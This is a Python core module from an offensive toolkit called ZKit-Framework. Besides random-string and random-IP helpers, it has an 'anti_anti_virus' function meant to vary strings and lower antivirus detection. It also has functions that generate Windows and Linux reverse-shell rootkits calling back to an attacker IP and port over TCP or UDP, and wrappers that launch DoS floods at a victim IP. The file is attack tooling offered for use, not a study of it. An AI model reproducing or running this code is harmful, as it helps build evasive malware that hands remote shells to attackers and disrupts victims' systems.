"""
The Core Module of ZKit-Framework Contains : Shortener methods , some other usefull methods like random string , random ip 
"""
import random
import string


def random_string(size=None):
    """
    Generates A Random String with given or random size .
    Arguments :
         size -- int : is optional can be omitted . if omitted size is an int in range(2..9)
    Returns a random string with lenght of Argument size
    example :
        random_string(2)
        returns [A-Z a-z][A-Z a-z]
    in simple : two letters that can be
        either lowercase or uppercase like : Aa or bZ or bz or Bz or BZ
        or if you increase the lenght it would be longer
    """
    if size == None:
        size = random.randint(4, 9)

    chars = string.ascii_lowercase + string.ascii_uppercase

    return ''.join(random.choice(chars) for _ in range(size))


def random_int(min_: int, max_: int):
    """
    generates a random int in a given range (min_...max_)  
    max_ and min_ must be integer


    Arguments:
        min_ -- int : minimum generated int
        max_ -- int : maximum generated int

    Returns result -- int =  a random int

    example :
        random_int(1 , 3)
        returns 1 or 2 or 3
    """
    ints = range(min_, max_+1)
    for i in range(0, len(str(max_))):
        randomed_int = str(random.choice(ints))
    return int(randomed_int)


def random_ip():
    """
    builds a random ip . it may not exist .

    Returns:
        ip : a random ip in correct form
    example :
        123.233.5.11
    """
    dot = '.'
    Result = str(random_int(20, 255)) + dot + str(random_int(15, 255))
    Result += dot + str(random_int(6, 255)) + dot + str(random_int(1, 255))
    return Result

def create_file(path: str):
    """
    Creates A New file if a file is on the given path if exists asks for overwrite permission
    if yes clears file data then closes it if no asks for another file path

    Arguments:
        path -- str : Path to File to create if exists asks for overwriting permission

    Returns A Path if file created returns file path if not returns asked file path
    or returns none if got wrong answer at YES or NO overwrite permission ask
    """
    from colorama import Fore
    red, blue, green, reset = Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTGREEN_EX, Fore.RESET
    from time import sleep as Sleep
    print('[' + green + '!' + reset + ']' +
          reset + 'Creating File...', end='')
    try:
        f = open(path,  'x').close()
    except FileExistsError:
        Sleep(0.5)
        choice = str(input(
            '\r[' + red + '-' + reset + '] ' + reset + 'Creating File...Failed \nFile Already Exists Confirm Overwrite : (N or Y) '))
        Choice = choice.upper()
        if Choice == 'Y':
            return path
        elif Choice == 'N':
            file_name = str(input('Write Down File Name Here : '))
            file_name += '.pyw '

            return file_name
        else:
            print(red + '\r[!] ' + reset + 'In Valid Input ', end='')
            return
    else:
        file_name = path
        print('\r[ ' + blue + '+ ' + reset + '] ' +
              reset + 'Creating File...Done ', end='')
        return file_name


def anti_anti_virus(Count: int):
    """
    Generates random strings for :
    if a virus created by ZKit-Framework found there is diffrent patern in another one.
    Argument:
          Count -- int : Count of random strings

    Returns A List That is either an error or result
    if it could not generate random string .
    result is ['Error']
    """
    from colorama import Fore
    red, blue, green, reset = Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTGREEN_EX, Fore.RESET
    from time import sleep as Sleep
    print('[ ' + green + '! ' + reset + '] ' +
          'Generating Random String To Decrease AV Ditection... ', end='')
    Sleep(0.2)
    try:
        Result = list()
        for i in range(0, Count):
            Result.extend(random_string())
    except:
        print('\r[' + red + '-' + reset + ']' +
              'Generating Random String To Decrease AV Ditection...Failed  ', end='')
        Sleep(1)
        print('\r[' + green + '!' + reset + ']' +
              'Generating Random String To Decrease AV Ditection...Failed -> Passed ')
        Sleep(0.2)
        Result = ['Error']
        return Result
    else:

        print('\r[' + blue + '+' + reset + ']' +
              'Generating Random String To Decrease AV Ditection...Done ')
        return Result


def rootkit_connect(connection_type: str):
    import Core.General.Rootkit_Connecter as connecter
    connecter.connect(connection_type)


def r_w_r_create(path: str, Attacker_ip: str, Attacker_port: int, mode: str):
    # r_w_r means type :rootkit platform : windows connection type : reverse_shell
    """
    Creates Rootkit with given information
    This Func is a shortener

    Arguments:

        path -- str : Path to the file . if exists gets an overwrite permission if not creates it
        Attacker ip -- str : Attacker machine ip or another ip set my user for transfering data to
        Attacker port -- int : An open port on attacker machine for transfering data to
        mode -- str : Mode is the connection type MUST BE EITHER TCP OR UDP

    Raises ValueError if Connection type is not either TCP or UDP
    """
    if mode == 'TCP':
        import Core.Windows.RootKit.Reverse_Shell_TCP as Rootkit
        path = create_file(path)
        strs = anti_anti_virus(4)
        Rootkit.create(Attacker_ip, Attacker_port, strs, path)
    elif mode == 'UDP':
        import Core.Windows.RootKit.Reverse_Shell_UDP as Rootkit
        path = create_file(path)
        strs = anti_anti_virus(4)
        Rootkit.create(Attacker_ip, Attacker_port, strs, path)
    else:
        raise ValueError('MODE Must Be Either TCP Or UDP')


def r_l_r_create(path, attacker_ip, attacker_port, mode):
    """
    Creates Rootkit with given information
    This Func is a shortener

    Arguments:
        path -- str : Path to the file . if exists gets an overwrite permission if not creates it
        Attacker_ip -- str : Attacker machine ip or another ip set my user for transfering data to
        Attacker_port -- int : An open port on attacker machine for transfering data to
        mode -- str : Mode is the connection type MUST BE EITHER TCP OR UDP

    Raises ValueError if Connection type is not either TCP or UDP
    """
    # r_l_r means rootkit.linux.reverse_shell
    if mode == 'TCP':
        import Core.Linux.RootKit.Reverse_Shell_TCP as Rootkit
        path = create_file(path)
        strs = anti_anti_virus(5)
        Rootkit.create(attacker_ip, attacker_port, strs, path)
    elif mode == 'UDP':
        import Core.Linux.RootKit.Reverse_Shell_UDP as Rootkit
        path = create_file(path)
        strs = anti_anti_virus(5)
        Rootkit.create(attacker_ip, attacker_port, strs, path)
    else:
        raise ValueError('MODE Must Be Either TCP Or UDP')


def dos_ss(Source_IP: str, Victim_IP: str, Source_Port: int, Victim_Port: int, Count: int, Message: str):
    import Core.General.Dos.SS as Dos_Script
    Dos_Script.run(Source_IP, Victim_IP, Source_Port,
                   Victim_Port, Count, Message)


def dos_sm(Source_IP: str, Victim_IP: str, Source_Port: int, Victim_Ports: list, Count: int, Message: str):
    import Core.General.Dos.SM as Dos_Script
    Dos_Script.run(Source_IP, Victim_IP, Source_Port,
                   Victim_Ports, Count, Message)


if __name__ == "__main__":
    print("Dont Run This File")
# Used For Test
#dos_ss('192.168.1.1', '127.0.0.1', 110 , 80 , 1, "Test")
